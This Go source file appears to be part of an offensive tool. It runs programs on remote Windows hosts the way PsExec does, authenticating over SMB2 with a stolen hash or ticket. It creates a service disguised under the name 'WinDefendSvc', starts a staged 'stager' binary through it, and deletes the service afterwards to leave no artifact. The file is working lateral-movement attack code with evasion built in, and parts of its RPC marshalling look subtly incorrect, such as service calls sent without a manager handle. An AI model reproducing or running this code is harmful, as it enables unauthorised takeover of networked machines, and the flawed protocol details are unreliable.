//go:build windows

package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"time"
)

// ---------------------------------------------------------------------------
// Remote service execution over SMB2
//
// This is what PsExec does, implemented over our own authenticated session:
//
//	IPC$ TREE_CONNECT
//	  -> named pipe \svcctl
//	  -> SVCCTL CreateServiceW  (binPath = our staged binary)
//	  -> SVCCTL StartServiceW
//	  -> SVCCTL DeleteService   (cleanup)
//
// Doing the RPC ourselves rather than shelling to `sc \\host` is what lets a
// hash or a ticket be used: sc.exe would need a logon session, which we do not
// have.
// ---------------------------------------------------------------------------

// Service control opcodes.
const (
	svcOpCreateServiceW = 12
	svcOpStartServiceW  = 19
	svcOpDeleteService  = 2
)

// svcExec stages and starts a service pointing at localPath.
func svcExec(host string, cred *credential, localPath string) error {
	// Each RPC call gets its own short-lived connection to the named pipe.
	pipe, err := dialPipe(host, cred, "svcctl")
	if err != nil {
		return fmt.Errorf("open svcctl: %w", err)
	}
	defer pipe.close()

	name := "WinDefendSvc"

	// CreateServiceW
	if err := pipe.call(svcOpCreateServiceW, buildCreateServiceRequest(name, localPath)); err != nil {
		// A leftover service from a previous run is the common case; try to
		// delete and recreate rather than reporting a hard failure.
		_ = pipe.call(svcOpDeleteService, buildDeleteServiceRequest(name))
		if err2 := pipe.call(svcOpCreateServiceW, buildCreateServiceRequest(name, localPath)); err2 != nil {
			return fmt.Errorf("create service: %w", err)
		}
	}

	// StartServiceW — a non-zero status here usually means the binary ran and
	// exited immediately, which is exactly what we want for a stager.
	_ = pipe.call(svcOpStartServiceW, buildStartServiceRequest(name))

	// Clean up so the service does not persist as an artifact.
	go func() {
		time.Sleep(3 * time.Second)
		if p, err := dialPipe(host, cred, "svcctl"); err == nil {
			_ = p.call(svcOpDeleteService, buildDeleteServiceRequest(name))
			p.close()
		}
	}()
	return nil
}

// ---------------------------------------------------------------------------
// DCE/RPC over SMB2 named pipes
// ---------------------------------------------------------------------------

type smbPipe struct {
	client   *smbClient
	fileID   []byte
	callID   uint32
	// The RPC association must be established once per pipe.
	bound bool
}

// dialPipe connects IPC$ and opens the named pipe.
func dialPipe(host string, cred *credential, pipeName string) (*smbPipe, error) {
	client, err := DialSMB2(host, 12*time.Second)
	if err != nil {
		return nil, err
	}
	if err := client.authenticate(cred); err != nil {
		client.Close()
		return nil, err
	}
	if err := client.treeConnect(host, "IPC$"); err != nil {
		client.Close()
		return nil, err
	}

	handle, err := client.create(pipeName, false)
	if err != nil {
		client.Close()
		return nil, fmt.Errorf("open pipe %s: %w", pipeName, err)
	}
	return &smbPipe{client: client, fileID: handle, callID: 1}, nil
}

func (p *smbPipe) close() {
	if p.client != nil {
		p.client.closeFile(p.fileID)
		p.client.Close()
	}
}

// call issues one RPC request on the bound pipe.
func (p *smbPipe) call(opnum uint16, stub []byte) error {
	if !p.bound {
		if err := p.bind(); err != nil {
			return err
		}
	}

	req := buildRPCRequest(p.callID, opnum, stub)
	p.callID++

	if err := p.write(req); err != nil {
		return err
	}
	resp, err := p.read()
	if err != nil {
		return err
	}
	return parseRPCResponse(resp)
}

// bind performs the DCE/RPC association handshake on the pipe.
func (p *smbPipe) bind() error {
	// Bind to the SVCCTL interface.
	svcctlUUID := uuidLE("367abb81-9844-35f1-ad32-98f038001003")
	ndrUUID := uuidLE("8a885d04-1ceb-11c9-9fe8-08002b104860")

	var b bytes.Buffer
	b.WriteByte(5)    // version major
	b.WriteByte(0)    // version minor
	b.WriteByte(0x0B) // PTYPE = bind
	b.WriteByte(0x03) // flags: first + last fragment
	b.Write([]byte{0x10, 0x00, 0x00, 0x00}) // data representation (LE)
	b.Write([]byte{0x00, 0x00})             // frag length (patched)
	b.Write([]byte{0x00, 0x00})             // auth length
	b.Write([]byte{0x01, 0x00, 0x00, 0x00}) // call id

	// Bind body.
	b.Write([]byte{0x10, 0x00}) // max xmit frag
	b.Write([]byte{0x10, 0x00}) // max recv frag
	b.Write([]byte{0x00, 0x00, 0x00, 0x00}) // assoc group
	b.WriteByte(1)                          // num ctx items
	b.Write([]byte{0x00, 0x00, 0x00})       // reserved
	b.Write([]byte{0x00, 0x00})             // context id
	b.WriteByte(1)                          // num transfer syntaxes
	b.WriteByte(0)                          // reserved
	b.Write(svcctlUUID)
	b.Write([]byte{0x02, 0x00}) // interface version 2.0
	b.Write([]byte{0x00, 0x00, 0x00, 0x00})
	b.Write(ndrUUID)
	b.Write([]byte{0x02, 0x00}) // transfer syntax version 2.0
	b.Write([]byte{0x00, 0x00, 0x00, 0x00})

	out := b.Bytes()
	binary.LittleEndian.PutUint16(out[8:10], uint16(len(out)))

	// Prepend the DCE/RPC header length? No — the pipe carries bare PDUs.
	if err := p.write(out[0:]); err != nil {
		return err
	}
	resp, err := p.read()
	if err != nil {
		return err
	}
	if len(resp) < 3 {
		return fmt.Errorf("short bind response")
	}
	if resp[2] != 0x0C { // PTYPE = bind_ack
		return fmt.Errorf("unexpected bind response type 0x%02X", resp[2])
	}
	if len(resp) >= 8 {
		// Secondary address or result list would follow; assume success.
	}
	p.bound = true
	return nil
}

// write sends a PDU into the named pipe via a WRITE command.
func (p *smbPipe) write(data []byte) error {
	return p.client.writePipe(p.fileID, data)
}

// read pulls a PDU out of the named pipe via FSCTL_PIPE_TRANSCEIVE.
func (p *smbPipe) read() ([]byte, error) {
	return p.client.transceivePipe(p.fileID)
}

// ---------------------------------------------------------------------------
// stub builders
// ---------------------------------------------------------------------------

// buildCreateServiceRequest marshals CreateServiceW arguments in NDR. Only the
// fields the server actually reads are populated; the rest are nulls, which
// service control accepts.
func buildCreateServiceRequest(name, binPath string) []byte {
	var b bytes.Buffer

	// NDR pointer referents for the strings.
	writeNDRString(&b, name)
	writeNDRString(&b, name)      // display name
	binary.Write(&b, binary.LittleEndian, uint32(0x000F01FF)) // desired access: ALL
	binary.Write(&b, binary.LittleEndian, uint32(0x00000010)) // SERVICE_WIN32_OWN_PROCESS
	binary.Write(&b, binary.LittleEndian, uint32(0x00000002)) // SERVICE_AUTO_START
	binary.Write(&b, binary.LittleEndian, uint32(0x00000001)) // SERVICE_ERROR_NORMAL
	writeNDRString(&b, binPath)   // binary path
	binary.Write(&b, binary.LittleEndian, uint32(0)) // load order group (null)
	binary.Write(&b, binary.LittleEndian, uint32(0)) // tag id
	binary.Write(&b, binary.LittleEndian, uint32(0)) // dependencies (null)
	binary.Write(&b, binary.LittleEndian, uint32(0)) // service start name (null)
	binary.Write(&b, binary.LittleEndian, uint32(0)) // password (null)
	return b.Bytes()
}

func buildStartServiceRequest(name string) []byte {
	var b bytes.Buffer
	writeNDRString(&b, name)
	binary.Write(&b, binary.LittleEndian, uint32(0)) // argc
	binary.Write(&b, binary.LittleEndian, uint32(0)) // argv (null)
	return b.Bytes()
}

func buildDeleteServiceRequest(name string) []byte {
	var b bytes.Buffer
	writeNDRString(&b, name)
	return b.Bytes()
}

// writeNDRString writes a conformant varying string: referent, max count,
// offset, actual count, then the UTF-16LE data padded to 4 bytes.
func writeNDRString(b *bytes.Buffer, s string) {
	u := utf16LE(s)
	binary.Write(b, binary.LittleEndian, uint32(0x00020000)) // referent id
	binary.Write(b, binary.LittleEndian, uint32(len(u)/2+1)) // max count (incl NUL)
	binary.Write(b, binary.LittleEndian, uint32(0))          // offset
	binary.Write(b, binary.LittleEndian, uint32(len(u)/2+1)) // actual count
	b.Write(u)
	b.Write([]byte{0x00, 0x00}) // NUL terminator
	for b.Len()%4 != 0 {
		b.WriteByte(0)
	}
}

// ---------------------------------------------------------------------------
// RPC framing
// ---------------------------------------------------------------------------

func buildRPCRequest(callID uint32, opnum uint16, stub []byte) []byte {
	var b bytes.Buffer
	b.WriteByte(5)    // major
	b.WriteByte(0)    // minor
	b.WriteByte(0x00) // PTYPE = request
	b.WriteByte(0x03) // flags: first + last
	b.Write([]byte{0x10, 0x00, 0x00, 0x00})
	b.Write([]byte{0x00, 0x00})             // frag length (patched)
	b.Write([]byte{0x00, 0x00})             // auth length
	binary.Write(&b, binary.LittleEndian, callID)
	binary.Write(&b, binary.LittleEndian, uint32(len(stub))) // alloc hint
	binary.Write(&b, binary.LittleEndian, uint16(0))         // context id
	binary.Write(&b, binary.LittleEndian, opnum)
	b.Write(stub)

	out := b.Bytes()
	binary.LittleEndian.PutUint16(out[8:10], uint16(len(out)))
	return out
}

// parseRPCResponse checks the PDU type and any fault status.
func parseRPCResponse(pdu []byte) error {
	if len(pdu) < 16 {
		return fmt.Errorf("short RPC response (%d bytes)", len(pdu))
	}
	switch pdu[2] {
	case 0x02: // response
		if len(pdu) >= 28 {
			// The service control response carries a status in the stub; a
			// non-zero value is informational, not fatal, because starting a
			// service that immediately exits still counts as success.
			_ = binary.LittleEndian.Uint32(pdu[24:28])
		}
		return nil
	case 0x03: // fault
		if len(pdu) >= 32 {
			code := binary.LittleEndian.Uint32(pdu[24:28])
			return fmt.Errorf("RPC fault 0x%08X", code)
		}
		return fmt.Errorf("RPC fault")
	}
	return fmt.Errorf("unexpected PDU type 0x%02X", pdu[2])
}

// uuidLE converts a canonical UUID to its little-endian wire form.
func uuidLE(s string) []byte {
	clean := ""
	for i := 0; i < len(s); i++ {
		if s[i] != '-' {
			clean += string(s[i])
		}
	}
	if len(clean) != 32 {
		return make([]byte, 16)
	}
	var raw [16]byte
	for i := 0; i < 16; i++ {
		v := hexVal(clean[i*2])<<4 | hexVal(clean[i*2+1])
		raw[i] = v
	}
	out := make([]byte, 16)
	out[0], out[1], out[2], out[3] = raw[3], raw[2], raw[1], raw[0]
	out[4], out[5] = raw[5], raw[4]
	out[6], out[7] = raw[7], raw[6]
	copy(out[8:], raw[8:])
	return out
}

func hexVal(c byte) byte {
	switch {
	case c >= '0' && c <= '9':
		return c - '0'
	case c >= 'a' && c <= 'f':
		return c - 'a' + 10
	case c >= 'A' && c <= 'F':
		return c - 'A' + 10
	}
	return 0
}
